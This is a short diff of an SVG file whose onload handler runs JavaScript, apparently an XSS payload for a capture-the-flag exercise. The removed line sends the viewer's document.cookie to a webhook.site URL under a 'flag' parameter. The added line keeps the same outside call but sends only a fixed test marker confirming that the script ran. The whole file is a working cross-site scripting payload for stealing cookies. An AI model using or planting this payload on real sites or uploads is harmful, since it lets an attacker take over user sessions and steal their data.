@@ -1,4 +1,4 @@
 <svg xmlns="http://www.w3.org/2000/svg" onload="
-  fetch('https://webhook.site/f6c3e79a-49e9-40c2-83bd-58943012dab8?flag=' + encodeURIComponent(document.cookie))
+  fetch('https://webhook.site/f6c3e79a-49e9-40c2-83bd-58943012dab8?test=svg_onload')
 ">
 </svg>
